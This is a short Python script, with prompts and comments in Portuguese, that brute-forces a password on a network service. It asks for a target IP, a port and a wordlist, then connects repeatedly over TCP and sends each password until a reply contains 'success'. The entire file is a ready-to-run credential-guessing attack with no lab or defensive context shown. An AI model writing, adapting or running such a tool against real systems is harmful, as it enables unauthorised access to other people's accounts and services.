import socket

ip = input("Digite o IP do alvo: ")
port = int(input("Digite a porta do alvo: "))
wordlist = input("Digite o caminho da wordlist: ")

def test_connect(senha):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            client.settimeout(3)
            client.connect((ip, port))
            client.sendall(senha.encode() + b'\n')  # Use \n se o protocolo pedir

            resposta = client.recv(1024).decode(errors='ignore')
            print(f"Testando senha: {senha}")

            if "password" in resposta.lower():
                print(f"Servidor pediu senha novamente. Enviando: {senha}")
                client.sendall(senha.encode() + b'\n')
                resposta = client.recv(1024).decode(errors='ignore')

            if "success" in resposta.lower():  # Corrigido aqui
                print(f"Senha correta encontrada: {senha}")
                return True
            else:
                print(f"Senha incorreta: {senha}")
    except Exception as e:
        print(f"Erro ao conectar ao servidor com senha '{senha}': {e}")
    return False

# Leitura da wordlist
try:
    with open(wordlist, "r", encoding="utf-8") as f:
        senhas = f.read().splitlines()
except Exception as e:
    print(f"Erro ao abrir a wordlist: {e}")
    exit()

# Loop de bruteforce
for senha in senhas:
    if test_connect(senha):
        break  # Para no sucesso
